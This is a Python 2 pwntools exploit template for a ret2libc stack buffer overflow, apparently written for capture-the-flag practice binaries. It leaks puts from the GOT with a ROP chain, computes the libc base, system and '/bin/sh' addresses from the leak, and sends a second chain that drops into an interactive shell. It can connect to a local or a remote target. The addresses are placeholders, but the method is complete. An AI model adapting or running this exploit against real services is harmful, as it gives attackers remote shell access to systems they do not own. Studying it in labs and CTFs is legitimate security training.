# This script only supports Python2
# Should be straight forward to convert to Python3

from pwn import *

# First we have to setup our connection
local = True
remote_conn = False

local_path = "./binary"

if local:
	p = process(local_path)
	elf = ELF(local_path)
	# ROP used to find gadgets and stuff
	rop = ROP(elf)

if remote_conn:
	p = remote('server.addr', port)
	elf = ELF(local_path)
	rop = ROP(elf)

# Put the offset here, (Note in 64bit system there maybe an extra 8 bytes to overflow the buffer)
junk = ''  # Example "A" * 72

if junk == '':
	log.info("You need to set an offset")
	exit()

# Search for puts_plt using objdump -d binary | grep "puts" or  "printf"
puts_plt = 0x1337

# Same as above except global offset table
puts_got = 0x1337

# Same as above except search for main
main_plt = 0x1337

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

log.success("Main PLT Address: " + hex(main_plt))
log.success("Puts PLT Address: " + hex(puts_plt))
log.success("Gadget: " + hex(pop_rdi))

# Create a ROP chain then return to the main function
rop_1 = [
	pop_rdi, puts_got,
	puts_plt, main_plt
]

rop_1 = ''.join([p64(r) for r in rop_1])

leak_payload = junk + rop_1

p.recvuntil("?\n") # Revc output buffer you need to adjust this if your payload
# Requires you to recv output multiple times
# You can use recvline() etc
p.sendline(leak_payload)

# Now we parse the leaked address we got from our first rop chain
leaked_address = u64(p.recvuntil("\n").strip().ljust(8, "\x00"))
log.success("Leaked Libc Address puts: " + hex(leaked_address))


# The last part is to actually obtain a shell from the leaked libc address

# First address to search for is System do this like below
# readelf -s path2libc | grep "system"
libc_system = 0x1337

# Next we will search same as above except for the address of puts
libc_puts = 0x1337

# Next search for exit so we have a clean exploit (search same as above)


# This time we search for strings within the location of the libc used in the executable
# Do this like strings -a -t x path2libc | grep "/bin/sh"
libc_bash = 0x1337

# Next we will calculate the real offsets
real_offset = leaked_address - libc_puts
real_system = libc_system + real_offset
#real_exit = real_offset + libc_exit

real_bash = libc_bash + real_offset # Might have to adjust this by subtracting 64

log.success("Found real offset: " + hex(leaked_address))
log.success("Found /bin/sh string at: " + hex(real_bash))
log.success("Found Libc Symbol System: " + hex(real_system))
#log.success("Found Libc Symbol Exit: " + hex(real_exit))

# Side pro tip: if you are using ubuntu 18 > memory aligment is different so you need
# to adjust your payload so that it aligns 16 bytes. most likely you will not have to
# do this remotely but on local when using ubuntu you will, i found this out the hard way

ret = 0x1337
# Set up our last rop chain to get the shell
rop_2 = [
	pop_rdi, real_bash,
	ret,
	real_system
]

rop_2 = ''.join([p64(r) for r in rop_2])

payload_shell = junk + rop_2

p.recvline()
p.sendline(payload_shell)

# Last we make our script interact ive

p.interactive()
